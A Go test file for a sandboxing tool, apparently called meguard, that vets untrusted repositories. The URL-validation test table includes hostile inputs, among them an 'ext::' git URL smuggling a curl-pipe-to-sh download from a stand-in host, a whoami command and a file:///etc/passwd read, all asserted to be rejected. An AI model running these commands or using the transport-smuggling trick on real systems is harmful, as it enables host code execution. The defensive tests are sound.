package cmd

import (
	"bytes"
	"context"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/IsraelGboluwaga/meguard/internal/analyze"
	"github.com/IsraelGboluwaga/meguard/internal/sandbox"
)

func TestIsGitURL(t *testing.T) {
	tests := []struct {
		source string
		want   bool
	}{
		{"https://github.com/foo/bar.git", true},
		{"https://github.com/foo/bar", true},
		{"http://example.com/repo", true},
		{"git://example.com/repo", true},
		{"ssh://git@example.com/repo.git", true},
		{"git@github.com:foo/bar.git", true},
		{"./local/path", false},
		{"/abs/local/path", false},
		{"../relative", false},
		{"some-dir", false},
		{"", false},
		// A bare ".git" suffix with NO accepted scheme must NOT be treated as a
		// clone target: it falls through to the safe local-path branch. This is
		// what closes the "ext:: transport smuggled behind a .git suffix" hole.
		{"repo.git", false},
		// git's command-executing transports must never be admitted, even when
		// crafted to end in ".git" (the old ".git"-suffix rule let these through,
		// and "git clone" would then run the payload on the host).
		{"ext::sh -c 'curl -s https://evil.sh | sh' .git", false},
		{"ext::sh -c whoami", false},
		{"file:///etc/passwd", false},
		{"fd::17/foo.git", false},
		// A "git@" string with no ":path" separator is not a valid scp-like URL.
		{"git@github.com", false},
	}
	for _, tt := range tests {
		t.Run(tt.source, func(t *testing.T) {
			if got := isGitURL(tt.source); got != tt.want {
				t.Errorf("isGitURL(%q) = %v, want %v", tt.source, got, tt.want)
			}
		})
	}
}

// fakeGitBin writes an executable `git` stub to a temp dir, prepends that dir to
// PATH for the duration of the test, and returns the path of a record file the
// stub dumps its environment into. It lets a test observe exactly what env
// resolveRepo hands `git clone` without a real remote or network.
func fakeGitBin(t *testing.T) (recordFile string) {
	t.Helper()
	dir := t.TempDir()
	recordFile = filepath.Join(dir, "git-env.log")
	// The stub must be named exactly "git" so it shadows the real git on PATH.
	// It dumps its whole environment to recordFile and exits 0 so the clone is
	// reported as successful (resolveRepo only checks the exit status).
	script := "#!/bin/sh\nenv > " + recordFile + "\nexit 0\n"
	if err := os.WriteFile(filepath.Join(dir, "git"), []byte(script), 0o755); err != nil {
		t.Fatalf("write fake git: %v", err)
	}
	t.Setenv("PATH", dir+string(os.PathListSeparator)+os.Getenv("PATH"))
	return recordFile
}

// TestResolveRepoCloneHardening is the regression guard for decision 0027: the
// host-side clone must lock git to safe transports so a crafted `ext::`/`file::`
// URL cannot execute a command on the host. It asserts resolveRepo runs `git
// clone` with GIT_ALLOW_PROTOCOL restricted to the four network transports and
// GIT_PROTOCOL_FROM_USER=0. Without these, an attacker-controlled source is one
// git default away from host code execution (invariant 1).
func TestResolveRepoCloneHardening(t *testing.T) {
	recordFile := fakeGitBin(t)

	dir, owned, cleanup, err := resolveRepo(context.Background(), "https://example.com/foo/bar.git", io.Discard)
	if err != nil {
		t.Fatalf("resolveRepo error: %v", err)
	}
	defer cleanup()
	if !owned {
		t.Errorf("owned = false for a cloned repo, want true")
	}
	if dir == "" {
		t.Fatal("resolveRepo returned an empty dir for a successful clone")
	}

	data, readErr := os.ReadFile(recordFile)
	if readErr != nil {
		t.Fatalf("fake git did not run (no env recorded): %v", readErr)
	}
	env := string(data)
	for _, want := range []string{
		"GIT_ALLOW_PROTOCOL=http:https:git:ssh",
		"GIT_PROTOCOL_FROM_USER=0",
	} {
		if !strings.Contains(env, want) {
			t.Errorf("clone env missing %q (transport hardening removed?)\n  got:\n%s", want, env)
		}
	}
}

func TestResolveRepoLocalPath(t *testing.T) {
	dir := t.TempDir()

	t.Run("existing directory resolves to abs path with noop cleanup", func(t *testing.T) {
		got, owned, cleanup, err := resolveRepo(context.Background(), dir, io.Discard)
		if err != nil {
			t.Fatalf("resolveRepo error: %v", err)
		}
		cleanup() // must be safe to call
		if owned {
			t.Errorf("owned = true for a local path used in place, want false")
		}
		want, _ := filepath.Abs(dir)
		if got != want {
			t.Errorf("dir = %q, want %q", got, want)
		}
	})

	t.Run("missing path errors", func(t *testing.T) {
		_, _, _, err := resolveRepo(context.Background(), filepath.Join(dir, "does-not-exist"), io.Discard)
		if err == nil {
			t.Fatal("expected error for missing path")
		}
	})

	t.Run("file that is not a directory errors", func(t *testing.T) {
		file := filepath.Join(dir, "afile")
		if err := os.WriteFile(file, []byte("x"), 0o600); err != nil {
			t.Fatal(err)
		}
		_, _, _, err := resolveRepo(context.Background(), file, io.Discard)
		if err == nil || !strings.Contains(err.Error(), "not a directory") {
			t.Fatalf("error = %v, want it to mention 'not a directory'", err)
		}
	})
}

// The pre-run notice must state the active protections so the user sees the
// guarantees before anything runs.
func TestPrintPreRunNotice(t *testing.T) {
	var buf bytes.Buffer
	printPreRunNotice(&buf, "./repo", "", "node", sandbox.Profile{}.Normalize())
	out := buf.String()
	for _, want := range []string{
		"NEVER runs on the host",
		"NO host $HOME and NO repo bind mounts",
		"network DENIED",
		"force-removed",
		"ecosystem:        node",
		sandbox.DefaultImage,
		"docker (trust boundary)", // default runtime is surfaced
	} {
		if !strings.Contains(out, want) {
			t.Errorf("notice missing %q\n  got:\n%s", want, out)
		}
	}
}

// An explicit --runtime is echoed back in the notice so the user can see which
// runtime (the trust boundary) is enforcing the sandbox.
func TestPrintPreRunNoticeRuntime(t *testing.T) {
	var buf bytes.Buffer
	printPreRunNotice(&buf, "./repo", "podman", "node", sandbox.Profile{}.Normalize())
	if out := buf.String(); !strings.Contains(out, "podman (trust boundary)") {
		t.Errorf("notice did not surface the chosen runtime\n  got:\n%s", out)
	}
}

// TestPrintCompactReportChecklistAndFindings covers the default (non
// --verbose) "meguard run" output: a status-checklist line per stage plus
// the top scan findings, rather than the full protections prose and finding
// list --verbose prints.
func TestPrintCompactReportChecklistAndFindings(t *testing.T) {
	var buf bytes.Buffer
	profile := sandbox.Profile{InspectEgress: true}.Normalize()
	result := sandbox.Result{
		InstallExitCode: 0,
		EgressInspected: true,
		Egress:          []sandbox.EgressEvent{{Proto: "dns", Dest: "registry.npmjs.org"}},
	}
	report := analyze.Report{
		FilesScanned: 109,
		Findings: []analyze.Finding{
			{Analyzer: "entropy", Severity: analyze.High, File: "tailwind.config.ts", Line: 98, Message: "abnormally long line"},
			{Analyzer: "entropy", Severity: analyze.Medium, File: "src/components/ui/button.tsx", Line: 8, Message: "abnormally long line"},
		},
	}
	printCompactReport(&buf, profile, result, prefetchOutcome{Attempted: true, OK: true}, nil, true, report)
	out := buf.String()
	for _, want := range []string{
		"✓ sandbox",
		"✓ install",
		"! scan       2 finding(s) (1 high, 1 medium) across 109 files",
		"✓ egress     1 blocked (registry.npmjs.org), 0 reached the network",
		"✓ secrets    0 exposed",
		"Top findings:",
		"HIGH",
		"tailwind.config.ts:98",
		"RESULT: clean install, 0 secrets exposed, 1 egress attempt(s) blocked",
		"Review the 1 high/critical finding(s) above",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("compact report missing %q\n  got:\n%s", want, out)
		}
	}
	if strings.Contains(out, "active protections:") {
		t.Errorf("compact report must not include the verbose protections prose\n  got:\n%s", out)
	}
}

func TestPrintResult(t *testing.T) {
	var buf bytes.Buffer
	printResult(&buf, sandbox.Result{InstallExitCode: 5}, nil, true, analyze.Report{})
	out := buf.String()
	for _, want := range []string{
		"install exit code: 5",
		"0 host secrets exposed",
		"egress: not inspected", // default run states egress was fully denied, not silently clean
	} {
		if !strings.Contains(out, want) {
			t.Errorf("result missing %q\n  got:\n%s", want, out)
		}
	}
}

// When egress is inspected, blocked attempts must be reported line by line.
func TestPrintResultEgressBlocked(t *testing.T) {
	var buf bytes.Buffer
	printResult(&buf, sandbox.Result{
		InstallExitCode: 0,
		EgressInspected: true,
		Egress: []sandbox.EgressEvent{
			{Proto: "tcp", Dest: "185.220.101.5:443"},
			{Proto: "dns", Dest: "api.evil-c2.net"},
		},
	}, nil, true, analyze.Report{})
	out := buf.String()
	for _, want := range []string{
		"2 outbound attempt(s) BLOCKED",
		"BLOCKED tcp 185.220.101.5:443",
		"BLOCKED dns api.evil-c2.net",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("egress result missing %q\n  got:\n%s", want, out)
		}
	}
}

// An inspected run with no attempts must say so explicitly, distinct from "not
// inspected". A clean result is a stated absence, never silent.
func TestPrintResultEgressCleanIsExplicit(t *testing.T) {
	var buf bytes.Buffer
	printResult(&buf, sandbox.Result{EgressInspected: true, Egress: []sandbox.EgressEvent{}}, nil, true, analyze.Report{})
	if out := buf.String(); !strings.Contains(out, "0 outbound attempts observed") {
		t.Errorf("clean inspected run must state zero attempts explicitly\n  got:\n%s", out)
	}
}

// A run where the monitor could not be read must say so, and must NOT claim the
// repo made zero calls.
func TestPrintResultEgressUnreadable(t *testing.T) {
	var buf bytes.Buffer
	printResult(&buf, sandbox.Result{EgressInspected: true, EgressReadFailed: true, Egress: nil}, nil, true, analyze.Report{})
	out := buf.String()
	if !strings.Contains(out, "could not be read") {
		t.Errorf("unreadable monitor must be surfaced\n  got:\n%s", out)
	}
	if strings.Contains(out, "0 outbound attempts") {
		t.Errorf("must not claim zero attempts when monitor was unreadable\n  got:\n%s", out)
	}
}

// A clean inspected run (nil/empty Egress, read did NOT fail) must report zero
// attempts, never "could not be read". This is the nil-vs-empty regression the
// live run surfaced.
func TestPrintResultEgressCleanNilIsZeroNotUnreadable(t *testing.T) {
	var buf bytes.Buffer
	printResult(&buf, sandbox.Result{EgressInspected: true, EgressReadFailed: false, Egress: nil}, nil, true, analyze.Report{})
	out := buf.String()
	if !strings.Contains(out, "0 outbound attempts observed") {
		t.Errorf("a clean run with nil Egress must report zero attempts\n  got:\n%s", out)
	}
	if strings.Contains(out, "could not be read") {
		t.Errorf("a successful read of zero events must not say 'could not be read'\n  got:\n%s", out)
	}
}

// The pre-run notice must switch to the inspected-network wording when egress
// inspection is on.
func TestPrintPreRunNoticeInspectEgress(t *testing.T) {
	var buf bytes.Buffer
	printPreRunNotice(&buf, "./repo", "", "node", sandbox.Profile{InspectEgress: true}.Normalize())
	out := buf.String()
	if !strings.Contains(out, "network INSPECTED") {
		t.Errorf("notice should state network is inspected\n  got:\n%s", out)
	}
	if strings.Contains(out, "network DENIED") {
		t.Errorf("inspected run should not also claim plain DENIED\n  got:\n%s", out)
	}
	// Inspection is now the default; the notice must point at --strict as the way
	// to the hardest no-network mode.
	if !strings.Contains(out, "--strict") {
		t.Errorf("inspected notice should mention --strict as the opt-out\n  got:\n%s", out)
	}
}

// TestPrintCompactExecLine covers the runtime-execution checklist line across
// its states: ran (build exited, server observed), skipped for --no-exec / no
// entry, and skipped because the install failed.
func TestPrintCompactExecLine(t *testing.T) {
	tests := []struct {
		name  string
		steps []sandbox.ExecStep
		res   sandbox.Result
		want  string
	}{
		{
			name:  "no steps",
			steps: nil,
			res:   sandbox.Result{InstallExitCode: 0},
			want:  "- exec       skipped (--no-exec, or no runnable entry detected)",
		},
		{
			name:  "install failed skips exec",
			steps: []sandbox.ExecStep{{Label: "start"}},
			res:   sandbox.Result{InstallExitCode: 1},
			want:  "- exec       skipped (install exited 1; app not run)",
		},
		{
			name:  "ran build then observed server",
			steps: []sandbox.ExecStep{{Label: "build"}, {Label: "start"}},
			res: sandbox.Result{InstallExitCode: 0, ExecOutcomes: []sandbox.ExecOutcome{
				{Label: "build", ExitCode: 0},
				{Label: "start", ExitCode: -1, Observed: true},
			}},
			want: "exec       ran build (exit 0), start (observed then stopped)",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var buf bytes.Buffer
			printCompactExecLine(&buf, tt.steps, tt.res)
			if !strings.Contains(buf.String(), tt.want) {
				t.Errorf("exec line = %q, want to contain %q", buf.String(), tt.want)
			}
		})
	}
}
